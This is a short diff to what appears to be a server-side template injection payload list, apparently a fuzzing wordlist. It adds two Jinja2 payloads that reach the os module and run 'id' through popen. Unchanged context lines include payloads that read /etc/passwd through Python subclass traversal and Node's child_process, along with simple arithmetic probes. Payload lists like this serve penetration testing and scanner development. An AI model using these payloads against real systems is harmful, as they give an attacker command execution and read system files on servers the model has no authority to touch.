@@ -75,6 +75,8 @@ $str.valueOf($chr.toChars($out.read()))
 {%for c in [1,2,3] %}{{c,c,c}}{% endfor %}
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
 #{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{lipsum.__globals__.os.popen('id').read()}}
 @(1+2)
 ${1+1}
 #{1+1}
